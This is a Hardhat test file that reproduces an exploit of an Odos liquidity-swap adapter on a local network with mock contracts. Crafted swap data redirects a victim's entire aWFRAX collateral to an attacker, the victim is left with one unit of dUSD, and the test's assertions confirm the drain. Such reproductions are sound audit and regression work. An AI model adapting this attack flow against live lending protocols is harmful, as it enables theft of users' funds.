import { expect } from "chai";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { ethers } from "hardhat";
import {
  OdosV1ExploitFixture,
  deployOdosV1ExploitFixture,
  createMaliciousSwapData
} from "./fixtures/setup";

describe("OdosLiquiditySwapAdapter exploit reproduction", function () {
  let fixture: OdosV1ExploitFixture;

  beforeEach(async function () {
    fixture = await loadFixture(deployOdosV1ExploitFixture);
  });

  it("drains a victim's collateral when swap data redirects value", async function () {
    const {
      deployer,
      victim,
      attacker,
      pool,
      router,
      attackExecutor,
      adapter,
      wfrax,
      dusd,
      aWfrax,
      aDusd
    } = fixture;

    const collateralAmount = ethers.parseUnits("17509.54233", 18);
    const dustAmount = 1n;

    await wfrax.mint(victim.address, collateralAmount);
    await dusd.mint(await router.getAddress(), dustAmount);
    await dusd.mint(await attackExecutor.getAddress(), dustAmount);

    await wfrax.connect(victim).approve(await pool.getAddress(), collateralAmount);
    await pool.connect(victim).supply(await wfrax.getAddress(), collateralAmount, victim.address, 0);

    expect(await aWfrax.balanceOf(victim.address)).to.equal(collateralAmount);

    await aWfrax.connect(victim).approve(await adapter.getAddress(), collateralAmount);

    const swapData = createMaliciousSwapData(router);
    await router.setSwapBehaviour(
      await wfrax.getAddress(),
      await dusd.getAddress(),
      collateralAmount,
      dustAmount,
      false,
      attacker.address
    );

    const permitInput = {
      aToken: await aWfrax.getAddress(),
      value: 0n,
      deadline: 0n,
      v: 0,
      r: ethers.ZeroHash,
      s: ethers.ZeroHash
    };

    const liquiditySwapParams = {
      collateralAsset: await wfrax.getAddress(),
      collateralAmountToSwap: collateralAmount,
      newCollateralAsset: await dusd.getAddress(),
      newCollateralAmount: dustAmount,
      user: victim.address,
      withFlashLoan: false,
      swapData: swapData
    };

    const attackerWfraxBefore = await wfrax.balanceOf(attacker.address);
    const victimAWfraxBefore = await aWfrax.balanceOf(victim.address);
    const routerDusdBefore = await dusd.balanceOf(await router.getAddress());

    await expect(
      attackExecutor
        .connect(attacker)
        .executeAttack(liquiditySwapParams, permitInput, dustAmount)
    )
      .to.emit(router, "MaliciousSwap")
      .withArgs(
        await adapter.getAddress(),
        await wfrax.getAddress(),
        await dusd.getAddress(),
        collateralAmount,
        dustAmount,
        attacker.address
      )
      .and.to.emit(attackExecutor, "DustRepaid")
      .withArgs(await router.getAddress(), dustAmount);

    expect(await aWfrax.balanceOf(victim.address)).to.equal(victimAWfraxBefore - collateralAmount);
    expect(await wfrax.balanceOf(attacker.address)).to.equal(attackerWfraxBefore + collateralAmount);
    expect(await aDusd.balanceOf(victim.address)).to.equal(dustAmount);

    expect(await dusd.balanceOf(await router.getAddress())).to.equal(routerDusdBefore);
    expect(await dusd.balanceOf(await pool.getAddress())).to.equal(dustAmount);
    expect(await wfrax.balanceOf(await pool.getAddress())).to.equal(0n);
    expect(await dusd.balanceOf(await attackExecutor.getAddress())).to.equal(0n);
  });
});
